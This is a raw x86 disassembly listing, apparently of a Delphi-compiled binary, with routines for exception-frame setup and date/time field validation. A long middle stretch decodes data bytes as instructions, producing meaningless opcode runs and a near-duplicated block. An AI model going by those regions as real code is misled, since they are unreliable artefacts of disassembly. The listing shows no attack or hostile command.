mov esp ebp
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_469260
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax esi
call sub_46982c
xor edx edx
mov eax edi
call sub_40321c
lea edx [ edi + 0x4 ]
mov eax esi
mov ecx 0x10
call sub_4029b0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4692b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ ecx + 0x4 ]
mov ecx eax
xor edx edx
mov eax esi
call sub_469260
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_46932e
mov eax eax
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_469450
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4151c8
xor eax eax
push ebp
push sub_469433
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4151d8
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415264
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4151c8
xor eax eax
push ebp
push sub_469406
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4151e4
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4691ac
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4151d0
retn
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415270
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_469208
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46943a
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4151d0
retn
sub_46945c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_469573
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x4 ]
jne r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414d54
mov eax esi
sub ax 0x8
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x8 ]
call sub_46912c
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_4047f4
mov ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415218
jmp r-xdata
sub ax 0xf8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46957a
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403fc0
lea eax [ ebp - 0x18 ]
call sub_4046a8
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x8 ]
call sub_46912c
mov ecx [ ebp - 0x20 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41520c
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4151c8
xor eax eax
push ebp
push sub_46953c
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x7
mov eax [ ebx + 0x8 ]
call sub_469144
fstp [ ebp - 0xc ]
fwait
push esi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4151e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4151d0
retn
sub_469584
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ax [ ebx + 0x4 ]
mov [ edi ] ax
mov ecx [ esi + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4692b0
mov [ edi + 0x8 ] eax
mov edx esi
mov eax ebx
call sub_4151f8
test al al
je r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_4151d8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4695d4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x1
jb r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_469058
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_469018
jmp r-xdata
jmp r-xdata
call sub_41519c
sub_469608
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4690ac
mov edx [ ebp + 0x8 ]
mov [ edx ] al
pop esi
pop ebx
pop ebp
retn 0x4
sub_469628
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
lea eax [ esp + 0x8 ]
call sub_4697a4
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
mov eax esi
mov edx ebx
call sub_40a7c8
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_469664
push ebx
push esi
mov ebx eax
mov si [ ebx + 0x2 ]
cmp si 0xc
ja r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov ax [ ebx ]
call sub_468ab4
cmp ax [ ebx + 0x4 ]
jb r-xdata
cmp [ ebx + 0x6 ] 0x17
ja r-xdata
cmp [ ebx + 0x8 ] 0x3b
ja r-xdata
cmp [ ebx + 0xa ] 0x3b
jbe r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4696a4
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx edx
mov edx esp
call sub_40b098
test al al
je r-xdata
test al al
jne r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
call sub_46975c
lea esi [ esp + 0x8 ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_469664
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edi ebx
mov esi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_4696f0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46974d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_4696a4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469754
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
sub_46975c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebx + 0x4 ]
lea edx [ ebx + 0x2 ]
lea eax [ ebp - 0x4 ]
call sub_409bf4
mov ax [ ebp - 0x4 ]
mov [ ebx ] ax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
lea ecx [ ebx + 0xa ]
lea edx [ ebx + 0x8 ]
lea eax [ ebx + 0x6 ]
call sub_409918
movzx eax [ ebp - 0x2 ]
mov [ ebx + 0xc ] eax
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4697a4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_468dfc
test al al
je r-xdata
mov cx [ ebx + 0x4 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409a78
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov ax [ ebx + 0xc ]
push eax
mov cx [ ebx + 0xa ]
mov dx [ ebx + 0x8 ]
mov ax [ ebx + 0x6 ]
call sub_4098d8
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xc ]
push eax
mov cx [ ebx + 0xa ]
mov dx [ ebx + 0x8 ]
mov ax [ ebx + 0x6 ]
call sub_4098d8
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_46982c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_469928
push [ fs : eax ]
mov [ fs : eax ] esp
movsx eax [ ebx ]
movzx edx [ ebx + 0x2 ]
add eax edx
movzx edx [ ebx + 0x4 ]
add eax edx
mov edx eax
movzx ecx [ ebx + 0x6 ]
add edx ecx
movzx ecx [ ebx + 0x8 ]
add edx ecx
movzx ecx [ ebx + 0xa ]
add edx ecx
test edx edx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46992f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
test eax eax
jle r-xdata
movzx eax [ ebx + 0x6 ]
movzx edx [ ebx + 0x8 ]
add eax edx
movzx edx [ ebx + 0xa ]
add eax edx
test eax eax
jbe r-xdata
mov si [ ebx ]
test si si
je r-xdata
cmp [ ebx + 0x6 ] 0x17
ja r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
cmp [ ebx + 0x2 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
cmp [ ebx + 0xa ] 0x3b
ja r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x3b
jbe r-xdata
cmp [ ebx + 0x2 ] 0x1f
ja r-xdata
mov dx [ ebx + 0x2 ]
mov eax esi
call sub_468ab4
cmp ax [ ebx + 0x4 ]
jae r-xdata
sub_469938
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_469969
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469970
retn
mov eax rw-data
call sub_40d420
sub_469994
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ ecx + 0xc0046 ]
add [ eax ] al
in al dx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
0xc0046 0x0
nop
cdq
inc esi
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ 0x64634245 ] dl
dec edi
jbe r-xdata
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
cmp al 0x32
inc eax
add [ 0x64634245 ] cl
inc ebp
js r-xdata
push ecx
inc ecx
add [ ecx + edx * 2 + 0x55980041 ] cl
inc ecx
add [ ecx + edx * 2 + 0x41 ] dh
jb r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
jo r-xdata
popad
popad
outsb
je r-xdata
add ah cl
mov [ ecx + 0x41 ] ss
insb
outsd
ja r-xdata
mov eax [ 0xffffffffa3040046 ]
inc esi
add al ah
dec ebp
inc ecx
outsd
outsb
mov eax eax
pushfd
0x46 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
0x140046 0x0
aam 0x5c
inc ecx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
imul ebp [ edi + 0x6e ] 0x9a38c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ecx + 0x73 ] al
inc esp
outsd
jne r-xdata
insb
fwait
inc esi
add [ edi ] al
or edx [ esi + eax * 2 + 0x4d ]
je r-xdata
enter 0x41a8 0x0
fsub [ edi + 0x540b0041 ]
jns r-xdata
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
call 0x3c46dbed
push edx
js r-xdata
add [ eax + eax ] 0x8
inc ecx
insb
push esp
adc [ eax ] al
and al 0x9e
inc esi
add [ edi + ebx * 4 ] ch
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41090002 ] al
push eax
fwait
inc esi
add [ eax + eax * 4 + 0x41 ] dl
add [ 0x4d460600 ] al
push esp
inc edx
arpl [ ebp + eax ] sp
mov esp 0x80004010
sahf
inc esi
add [ eax + 0x100469f ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
jae r-xdata
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
je r-xdata
nop
push eax
fwait
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 4 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 4 + 0x46 ] bl
add [ eax ] ch
add [ eax ] al
add al ah
jg r-xdata
add [ eax + 0x74004155 ] bl
push ecx
inc ecx
jo r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_469ca7
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
je r-xdata
outsb
je r-xdata
jae r-xdata
add [ ecx ] cl
inc ecx
jne r-xdata
push esp
dec ebp
inc esi
dec ebp
push esp
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov al 0xa7
inc ecx
add al al
test al 0x41
add al cl
test al 0x41
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ ebx ] cl
push esp
add [ ecx - 0x5bcfffba ] bh
inc esi
add [ esp + 0x46 ] bh
add al al
push ecx
inc ecx
add [ eax - 0x2bffbeb3 ] ch
movsb [ edi ] [ esi ]
inc esi
add [ edx + edx * 2 + 0x585c0041 ] al
inc ecx
add [ eax + 0x58 ] ch
inc ecx
add [ eax - 0xfffbe9c ] al
inc ecx
add al dl
movsb [ edi ] [ esi ]
inc esi
add [ edx ] dl
push esp
inc esi
dec ebp
push esp
inc edx
arpl [ esi + edx * 2 + 0x61 ] sp
jb r-xdata
imul ebp [ edi + 0x6e ] 0x9a9cc08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5efe4d35 ]
nop
cdq
inc esi
add al ch
ja r-xdata
imul ebp [ esi + 0x67 ] 0x83ec8b55
push [ eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
jb r-xdata
jae r-xdata
adc [ eax ] al
mov eax 0x9400469d
sahf
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080004 ] al
jb r-xdata
pushfd
stc
[ ebx - 0x3d ]
cli
add al 0x0
or [ ecx + 0x73 ] al
push ebx
adc [ eax ] al
je r-xdata
inc ecx
jae r-xdata
outsb
arpl [ ecx - 0x54 ] di
adc [ eax ] al
int3
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or al [ ecx + 0x73 ]
inc ebx
inc esi
add [ edi + ebx * 4 + 0x10046 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
mov eax ebx
call sub_408fcc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
or ecx [ ebp - 0x36cc0bab ]
insd
popad
insb
insb
dec ecx
outsb
je r-xdata
or al [ ecx + 0x73 ]
push ebx
sub_469a9e
inc ecx
add [ eax + 0x51 ] bh
inc ecx
add [ ecx + edx * 2 + 0x518c0041 ] ch
inc ecx
add [ eax + 0x74004155 ] bl
push ecx
inc ecx
add ah cl
mov eax [ 0xffffffffa3040046 ]
inc esi
add al ah
dec ebp
inc ecx
add [ ecx - 0x5bcfffba ] bh
inc esi
add [ esp + 0x46 ] bh
add al al
push ecx
inc ecx
add [ eax - 0x2bffbeb3 ] ch
movsb [ edi ] [ esi ]
inc esi
add [ edx + edx * 2 + 0x585c0041 ] al
inc ecx
add [ eax + 0x58 ] ch
inc ecx
add [ eax - 0xfffbe9c ] al
inc ecx
add al dl
movsb [ edi ] [ esi ]
inc esi
add [ edx ] dl
push esp
inc esi
dec ebp
push esp
inc edx
arpl [ esi + edx * 2 + 0x61 ] sp
jb r-xdata
popad
popad
outsb
je r-xdata
add [ eax ] eax
or [ ecx + 0x73 ] al
inc esp
outsd
jne r-xdata
insb
fwait
inc esi
add [ edi ] al
or edx [ esi + eax * 2 + 0x4d ]
je r-xdata
enter 0x41a8 0x0
fsub [ edi + 0x540b0041 ]
jns r-xdata
add [ eax + eax ] 0x8
inc ecx
insb
push esp
adc [ eax ] al
and al 0x9e
inc esi
add [ edi + ebx * 4 ] ch
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41090002 ] al
push eax
fwait
inc esi
add [ eax + eax * 4 + 0x41 ] dl
add [ 0x4d460600 ] al
push esp
inc edx
arpl [ ebp + eax ] sp
mov esp 0x80004010
sahf
inc esi
add [ eax + 0x100469f ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
jae r-xdata
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
je r-xdata
nop
push eax
fwait
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 4 + 0x46 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebx * 4 + 0x46 ] bl
add [ eax ] ch
add [ eax ] al
add al ah
jg r-xdata
pop ecx
mov [ fs : eax ] edx
push sub_469ca7
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
je r-xdata
outsb
je r-xdata
jae r-xdata
add [ ecx ] cl
inc ecx
jne r-xdata
push esp
dec ebp
inc esi
dec ebp
push esp
inc edx
arpl [ esp + eax * 2 + 0x61 ] sp
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov al 0xa7
inc ecx
add al al
test al 0x41
add al cl
test al 0x41
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ ebx ] cl
push esp
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5efe4d35 ]
nop
cdq
inc esi
add al ch
ja r-xdata
imul ebp [ esi + 0x67 ] 0x83ec8b55
push [ eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
jb r-xdata
jae r-xdata
adc [ eax ] al
mov eax 0x9400469d
sahf
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080004 ] al
jb r-xdata
pushfd
stc
[ ebx - 0x3d ]
cli
add al 0x0
or [ ecx + 0x73 ] al
push ebx
adc [ eax ] al
je r-xdata
inc ecx
jae r-xdata
outsb
arpl [ ecx - 0x54 ] di
adc [ eax ] al
int3
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
or al [ ecx + 0x73 ]
inc ebx
inc esi
add [ edi + ebx * 4 + 0x10046 ] dl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
mov eax ebx
call sub_408fcc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
or ecx [ ebp - 0x36cc0bab ]
insd
popad
insb
insb
dec ecx
outsb
je r-xdata
or al [ ecx + 0x73 ]
push ebx
sub_469c40
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469ca0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax ebx
call sub_408fcc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b938
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469ca7
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_469ce0
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
call sub_46c994
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_469d14
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
call sub_46c638
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_469d48
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
add edx 0x4
call sub_46c76c
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_469d74
push ebx
push esi
push edi
add esp 0xffffffdc
mov ebx eax
mov ecx esp
lea eax [ ebx + 0x4 ]
add edx 0x4
call sub_46c928
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_469dcc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_469e15
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
lea eax [ ebx + 0x4 ]
call sub_46ccc4
mov eax [ ebp - 0xc ]
call sub_409758
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469e1c
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
sub_469e24
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_469e65
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4 ]
call sub_46ccc4
mov eax [ ebp - 0x4 ]
call sub_4083f0
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469e6c
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_469e94
push ebx
push esi
push edi
add esp 0xffffffdc
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_46a4f4
mov esi esp
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
add esp 0x24
pop edi
pop esi
pop ebx
retn
sub_469ebc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x28 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_469f1c
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x28 ]
call sub_4096f8
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_46a4f4
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469f23
lea eax [ ebp - 0x28 ]
call sub_403f9c
retn
sub_469f2c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x28 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_469f86
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x28 ]
mov eax esi
call sub_4082b4
mov eax [ ebp - 0x28 ]
lea edx [ ebp - 0x24 ]
call sub_46a4f4
lea esi [ ebp - 0x24 ]
lea edi [ ebx + 0x4 ]
mov ecx 0x8
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469f8d
lea eax [ ebp - 0x28 ]
call sub_403f9c
retn
sub_469fc0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40321c
lea edx [ edi + 0x4 ]
mov eax esi
mov ecx 0x22
call sub_4029b0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_46a008
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_46a0a8
push [ fs : eax ]
mov [ fs : eax ] esp
fld [ ebp + 0xc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4096f8
mov eax [ ebp - 0x48 ]
lea edx [ ebp - 0x22 ]
call sub_46a4f4
mov ax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x44 ]
lea eax [ ebp - 0x22 ]
mov ecx esi
call sub_46c214
test al al
jne r-xdata
add esp 0xfffffff0
call sub_403570
lea ecx [ ebp - 0x44 ]
xor edx edx
mov eax edi
call sub_469fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a0af
lea eax [ ebp - 0x4c ]
mov edx 0x2
call sub_403fc0
retn
lea edx [ ebp - 0x4c ]
